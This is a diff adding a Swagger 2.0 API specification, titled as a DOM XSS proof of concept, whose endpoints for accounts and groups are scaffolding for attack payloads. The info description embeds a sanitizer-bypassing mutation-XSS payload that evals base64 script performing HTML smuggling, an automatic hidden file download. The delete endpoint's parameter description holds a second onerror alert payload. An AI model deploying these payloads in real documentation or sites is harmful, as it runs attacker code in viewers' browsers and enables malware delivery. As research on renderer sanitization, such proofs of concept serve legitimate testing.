@@ -1,0 +1,90 @@
+swagger: '2.0'
+info:
+  title: DOM XSS POC 
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='PGh0bWw+PGhlYWQ+PHRpdGxlPkhUTUwgU211Z2dsaW5nPC90aXRsZT48L2hlYWQ+PGJvZHk+PHA+VGhpcyBpcyBhbGwgdGhlIHVzZXIgd2lsbCBzZWUuLi48L3A+PHNjcmlwdD5mdW5jdGlvbiBjb252ZXJ0RnJvbUJhc2U2NChiYXNlNjQpe3ZhciBiaW5hcnlfc3RyaW5nPXdpbmRvdy5hdG9iKGJhc2U2NCk7dmFyIGxlbj1iaW5hcnlfc3RyaW5nLmxlbmd0aDt2YXIgYnl0ZXM9bmV3IFVpbnQ4QXJyYXkobGVuKTtmb3IodmFyIGk9MDtpPGxlbjtpKyspe2J5dGVzW2ldPWJpbmFyeV9zdHJpbmcuY2hhckNvZGVBdChpKTt9cmV0dXJuIGJ5dGVzLmJ1ZmZlcjt9dmFyIGZpbGU9J1ZHaHBjeUJwY3lCaElITnRkV2RuYkdWa0lHWnBiR1U9Jzt2YXIgZGF0YT1jb252ZXJ0RnJvbUJhc2U2NChmaWxlKTt2YXIgYmxvYj1uZXcgQmxvYihbZGF0YV0se3R5cGU6J29jdGV0L3N0cmVhbSd9KTt2YXIgZmlsZU5hbWU9J3Rlc3QudHh0JztpZih3aW5kb3cubmF2aWdhdG9yLm1zU2F2ZU9yT3BlbkJsb2Ipd2luZG93Lm5hdmlnYXRvci5tc1NhdmVCbG9iKGJsb2IsZmlsZU5hbWUpO2Vsc2V7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnYScpO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7YS5zdHlsZT0nZGlzcGxheTogbm9uZSc7dmFyIHVybD13aW5kb3cuVVJMLmNyZWF0ZU9iamVjdFVSTChibG9iKTthLmhyZWY9dXJsO2EuZG93bmxvYWQ9ZmlsZU5hbWU7YS5jbGljaygpO3dpbmRvdy5VUkwucmV2b2tlT2JqZWN0VVJMKHVybCk7fTwvc2NyaXB0PjwvYm9keT48L2h0bWw+Cg==' onerror='eval(atob(this.id))'>"></form>
+
+  version: production
+basePath: /random/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
+security:
+  - basicAuth: []
+paths:
+  /accounts:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: findAccounts
+      summary: Finds all accounts
+  '/accounts/groupid/{id}':
+    delete:
+      parameters:
+        - description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('XSS') src=1>"></form>
+
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: deleteGroupById
+      summary: Deletes a group by id
+    get:
+      parameters:
+        - description: Id value to filter by
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: findGroupsById
+      summary: Finds groups by id
+    post:
+      parameters:
+        - description: Id value to filter by
+          in: path
+          name: id
+          required: true
+          type: string
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      description: 'You cannot create an LDAP group with a POST.  '
+      operationId: createGroupById
+      summary: Creates a new group by id
+    put:
+      parameters:
+        - description: Id value to filter by
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      description: You cannot change information for an LDAP group with a PUT.
+      operationId: updateGroupById
+      summary: Updates an existing group by id
